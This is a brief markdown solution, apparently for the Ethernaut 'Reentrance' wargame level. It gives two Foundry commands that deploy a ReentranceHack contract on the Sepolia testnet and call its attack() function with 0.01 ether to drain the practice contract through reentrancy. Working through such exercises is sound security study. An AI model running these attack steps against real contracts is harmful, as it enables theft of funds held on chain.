# Reentrance Solution

Deploy `ReentranceHack`:

```
forge create ReentranceHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args `ìnstanceAddress`
```

Call the `attack()` function:

```
cast send `reentranceHackAddress` "attack()" --value 10000000000000000wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
